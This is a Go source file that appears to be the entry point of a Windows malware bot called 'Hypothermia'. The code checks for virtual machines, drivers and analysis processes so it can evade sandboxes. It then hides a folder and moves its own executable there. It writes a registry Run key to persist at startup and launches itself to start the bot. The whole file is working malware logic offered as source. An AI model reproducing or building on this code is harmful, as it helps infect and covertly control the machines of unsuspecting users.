package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"

	"Hypothermia/config"
	"Hypothermia/src/bot"
	"Hypothermia/src/utils"
)

func main() {
	if config.AntiVM {
		if utils.CheckVMs() {
			fmt.Println("adc/v")
			fmt.Scanln()
			return
		}

		if utils.CheckDrivers() {
			fmt.Println("adc/d")
			fmt.Scanln()
			return
		}

		if utils.CheckProcesses() {
			fmt.Println("adc/p")
			fmt.Scanln()
			return
		}
	}

	if len(os.Args) >= 2 && os.Args[1] == config.Verifier {
		bot.Init()
		return
	}

	folder := utils.GetMainFolder()
	_, err := os.Stat(folder)
	if err != nil {
		if os.IsNotExist(err) {
			err = os.MkdirAll(folder, os.ModePerm)
			if err != nil {
				fmt.Println("main/1 -", err)
				fmt.Scanln()
				return
			}

			if !config.Debugging && config.HideFolder {
				err = utils.HideItem(folder)
				if err != nil {
					fmt.Println("main/2 -", err)
					fmt.Scanln()
					return
				}
			}
		}
	}

	oldPath, err := os.Executable()
	if err != nil {
		fmt.Println("main/3 -", err)
		fmt.Scanln()
		return
	}

	newPath := filepath.Join(folder, filepath.Base(oldPath))
	err = os.Rename(oldPath, newPath)
	if err != nil {
		fmt.Println("main/4 -", err)
		fmt.Scanln()
		return
	}

	if !config.Debugging && config.AddToStartup {
		err := utils.SetRegistry(
			"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
			config.HypothermiaName,
			fmt.Sprintf("\"%s\" %s", newPath, config.Verifier),
		)

		if err != nil {
			fmt.Println("main/5 -", err)
			fmt.Scanln()
			return
		}
	}

	cmd := exec.Command(newPath, config.Verifier)
	err = cmd.Start()
	if err != nil {
		fmt.Println("main/6 -", err)
		fmt.Scanln()
		return
	}
}
